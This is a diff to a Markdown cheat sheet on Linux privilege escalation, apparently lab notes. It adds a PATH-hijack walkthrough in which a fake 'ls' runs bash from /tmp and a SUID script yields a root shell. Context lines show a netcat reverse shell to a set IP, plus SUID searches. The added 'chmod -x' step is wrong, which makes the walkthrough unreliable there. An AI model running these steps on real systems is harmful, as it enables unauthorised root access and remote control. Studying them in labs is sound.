@@ -2,9 +2,12 @@
 
 ## Table of Contents
 
-[Query The System](#query-the-system)
-[Use LinEnum.sh to exfiltrate system information](#linenumsh-to-exfiltrate-the-system-information)
-[use FIND to enumerate potential exploits](#use-find-to-identify-useful-file-properties-and-attributes)
+[Query The System](#query-the-system)  
+[Use LinEnum.sh to exfiltrate system information](#linenumsh-to-exfiltrate-the-system-information)  
+[use FIND to enumerate potential exploits](#use-find-to-identify-useful-file-properties-and-attributes)  
+[Identify Exploitable Commands](#identify-exploitable-commands)  
+
+
 
 
 ## Initial checklist
@@ -107,7 +110,7 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
 `:> find / -perm /2000` : recursively search from the root directory and list objects with the SGID bit set  
 `:> find / -perm /4000` : recursively search from the root directory and list objects with the SUID bit set  
   
-### Find exploitable binaries
+### Identify exploitable commands
 
 `:> sudo -l` list commands on which the current user may use sudo
 
@@ -235,9 +238,43 @@ mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1
 
 ## Exploiting the PATH variable
 
-### Show the current user's path  
+### Show the current user's PATH 
 
 `:> echo $PATH`
+
+![Echo Path](assets/Linux-PrivEsc-09-path-01.png)  
+
+### Build an imitation binary  
+
+`:> echo '/bin/bash' > /tmp/ls`  
+`:> chmod -x /tmp/ls`  
+
+When this binary is called, it will open a bash shell, not list the files in the current directory  
+
+![Echo Path](assets/Linux-PrivEsc-09-path-02.png)  
+
+### Alter the PATH variable  
+
+`:> export PATH=/tmp:$PATH`  
+
+Add the /tmp directory to the PATH  
+
+When a users calls "ls" the system will see the "ls" in the tmp folder and execute the '/bin/bash' command to open a shell, ratheer than list the contents of the current directory.  
+
+![tmp on Path](assets/Linux-PrivEsc-09-path-03.png)  
+
+### Run the script file  
+
+Observe the script binary has the SUID set. Any command called by the script runs with the owner's (root) privileges.  
+
+![SUID set](assets/Linux-PrivEsc-09-path-05.png)
+
+`:> cd ~`
+`:> ./script.sh`
+
+Achieve root shell
+
+![root](assets/Linux-PrivEsc-09-path-04.png)  
 
 ## Other References
 
